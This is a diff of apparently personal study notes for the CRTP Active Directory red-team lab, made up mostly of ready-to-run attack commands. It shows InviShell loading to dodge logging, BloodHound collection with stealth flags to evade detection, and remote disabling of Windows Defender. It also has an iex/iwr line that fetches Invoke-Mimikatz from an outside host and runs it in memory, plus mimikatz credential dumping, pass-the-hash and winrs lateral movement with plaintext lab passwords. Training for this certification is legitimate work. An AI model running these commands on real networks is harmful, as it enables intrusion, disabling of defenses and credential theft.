@@ -1,5 +1,6 @@
 # CRTP One Week Challenge
 #Main Notes
+Initial Access > Local PrivEsc > mimikatz > latral movement > mimikatz with new user
 ### Load InviShell to avoid any enhanced login locally
 ```
 C:/AD/Tools/InviShell/RunWithRegistryNonAdmin.bat
@@ -469,11 +470,10 @@ Invoke-UserHunter -GroupName "RDPUsers"
 ```
 To confirm admin access in another local computer if yes you can run commands
 ```
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess
+#OR
 Invoke-UserHunter -CheckAccess   #check if you have admin access on another computer
-Invoke-Command -Computername dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {whoami;hostname}   #check who you are
-Invoke-Command -Computername dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true}   #Disable win defender
-iex (iwr http://172.16.100.7:9090/Invoke-Mimikatz.ps1 -UseBasicParsing)   #load mimikatz on the memory
-Invoke-Command -Computername dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock ${function:Invoke-Mimikatz}   #run mimikatz
 ```
 Find computers where a domain admin is logged in
 ```
@@ -1627,28 +1627,66 @@ C:\Scripts\LAPSexport.ps1
 
 3. Then, run the script to verify it works correctly. If it does, you should automate this procedure by creating a Scheduled Task.
 
-# BloodHound Enumeration
-Enable Sharp-Hound and execute
+# BloodHound Enumeration   Need Admin Privs
+### Data Collection 
 ```
-. .\SharpHound.ps1
+bloodhound-python -d raman.local -u machine1 -p Ab2002.. -ns <DC-IP> -c all   #Jason files
+#OR use
+. .\SharpHound.ps1  |  Sharphound.exe   #transfer it to the target machine
+#OR use
 Invoke-BloodHound -CollectionMethod All,LoggedOn
 Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
 ```
-To avoid detections like ATA
+To avoid detections like MDI
 ```
 Invoke-BloodHound -CollectionMethod All -ExcludeDC
 ```
+To avoid detections use Stealth
+```
+Invoke-BloodHound -Stealth
+SharpHound.exe --stealth
+```
+### Start BloodHound
 Start neo4j and BloodHound UI on kali machine and load the zip/json files
 ```
-sudo neo4j console&;bloodhound&
+sudo neo4j console  (credentials neo4j:to0or) | ulimit -n 100000  (if the service didn't work. Warning: max 1024 open files..)  #Get the local address from here
+sudo bloodhound   (credentials neo4j:to0or)
 ```
 
+# Lateral Movement - PowerShell Remoting
+Avoid using psexec as it is too noisy. instead use `"Enter-PSSession"` need Admin Privs
+```
+Enter-PSSession -ComputerName <dcorp-adminsrv>
+```
+### Execute commands or scriptblocks on another machine
+```
+Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {whoami;hostname}   #check who you are
+Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true}   #Disable win defender
+```
+### Execute locally loaded function on another machine
+```
+Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock ${function:Get-PassHahses}
+iex (iwr http://172.16.100.7:9090/Invoke-Mimikatz.ps1 -UseBasicParsing)   #load mimikatz on the memory
+Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock ${function:Invoke-Mimikatz}   #run mimikatz
+```
+### Execute scripts from files on another machine
+```
+Invoke-Command -Computername dcorp-mgmt.dollarcorp.moneycorp.local -FilePath C:\scripts\Get-PassHahes.ps1   #check who you are
+```
+### connect to different machines using winrs
+```
+winrs -r:dcorp-adminsrv cmd
+winrs -remote:server1 -u:server1\administrator -p:Pass@123 hostname
+```
+
+
+
 # Mimikatz
-# Dump Creds from memory admin privilege is required
+### Dump Creds from memory admin privilege is required
 ```
 privilege::debug | token::elevate | sekurlsa::logonpasswords
 ```
-# run powrshell using NTLM hash of a user
+### run powrshell using NTLM hash of a user
 ```
 sekurlsa::pth /user:svcadmin /ntlm:b38ff50264b74508085d82c69794a4d8 /domain:dollarcorp.moneycorp.local /run:powershell.exe
 ```
